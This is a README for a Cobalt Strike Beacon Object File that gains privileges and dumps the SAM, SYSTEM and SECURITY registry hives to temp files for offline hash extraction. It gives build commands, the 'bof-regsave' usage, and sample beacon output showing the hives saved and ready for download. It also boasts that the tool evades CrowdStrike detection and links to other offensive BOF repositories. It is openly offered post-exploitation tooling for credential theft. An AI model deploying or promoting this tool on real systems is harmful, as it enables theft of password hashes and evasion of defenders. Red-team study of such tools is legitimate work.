# About
Beacon Object File(BOF) for CobaltStrike that will acquire the necessary privileges and dump SAM - SYSTEM - SECURITY registry keys for offline parsing and hash extraction.

It will write 3 'temporary files' containing the SYSTEM, SAM and SECURITY hives to the standard temporary directory. They can then be downloaded and deleted from the host system.

## Compiling

Compiled BOFs provided for ease, but otherwise just run `make` in the root directory.

```
[stuart@ubuntu ~/dev/github.stufus/BOF-RegSave]$ make
x86_64-w64-mingw32-gcc -o source/entry_x64.o -c source/entry.c -Os -s -Qn -nostdlib  -Wl,-s,--exclude-all-symbols
x86_64-w64-mingw32-strip -N entry.c source/entry_x64.o
i686-w64-mingw32-gcc -o source/entry_x86.o -c source/entry.c -Os -s -Qn -nostdlib  -Wl,-s,--exclude-all-symbols
i686-w64-mingw32-strip -N entry.c source/entry_x86.o
x86_64-w64-mingw32-ld -x -r source/*_x64.o -o regdump.x64.o
i686-w64-mingw32-ld -x -r source/*_x86.o -o regdump.x86.o
```

## Instructions

Install the CNA script and run the `bof-regsave` command.

## Example

```
beacon> bof-regsave
[+] host called home, sent: 2336 bytes
[+] received output:
regsave: SYSTEM hive saved to C:\Users\IT07C5~1.USE\AppData\Local\Temp\tmp4815.tmp
regsave: SAM hive saved to C:\Users\IT07C5~1.USE\AppData\Local\Temp\tmp4813.tmp
regsave: SECURITY hive saved to C:\Users\IT07C5~1.USE\AppData\Local\Temp\tmp4814.tmp
```

Those files can then be downloaded using the `download` command.

## Detection

At the time of writing (15/July/2022), this is not detected by Crowdstrike in aggressive mode.

## Credits

Template & Makefile based on repo from [@realoriginal](https://github.com/realoriginal/beacon-object-file)

## Reading material for BOF

[CS Beacon Object Files](https://www.cobaltstrike.com/help-beacon-object-files)

[Aggressor-Script functions](https://www.cobaltstrike.com/aggressor-script/functions.html)

[Beacon Object Files - Luser Demo](https://www.youtube.com/watch?v=gfYswA_Ronw)

[A Developer's Introduction To Beacon Object Files](https://www.trustedsec.com/blog/a-developers-introduction-to-beacon-object-files/)

_Github repos_

```
https://github.com/rsmudge/ZeroLogon-BOF
https://github.com/rsmudge/CVE-2020-0796-BOF
https://github.com/trustedsec/CS-Situational-Awareness-BOF
https://github.com/tomcarver16/BOF-DLL-Inject
https://github.com/m57/cobaltstrike_bofs/
https://github.com/rvrsh3ll/BOF_Collection/
https://github.com/realoriginal/bof-NetworkServiceEscalate
```

## Author
[@leftp](https://github.com/leftp)
[@ukstufus](https://github.com/stufus) Automatically obtain and create temporary files for ease of use (and a little stealth), using beacon output
formatting for tidier output, minor debugging changes.
